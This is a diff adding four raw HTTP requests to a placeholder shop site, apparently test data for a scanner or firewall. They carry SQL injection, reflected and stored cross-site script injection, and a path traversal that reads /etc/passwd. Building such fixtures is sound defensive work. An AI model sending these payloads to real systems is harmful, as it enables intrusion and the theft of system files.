@@ -1,0 +1,25 @@
+GET /?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: text/html,application/xhtml+xml
+
+
+GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: text/html,application/xhtml+xml
+
+
+POST /comments HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: text/html,application/xhtml+xml
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+
+comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: text/html,application/xhtml+xml
+
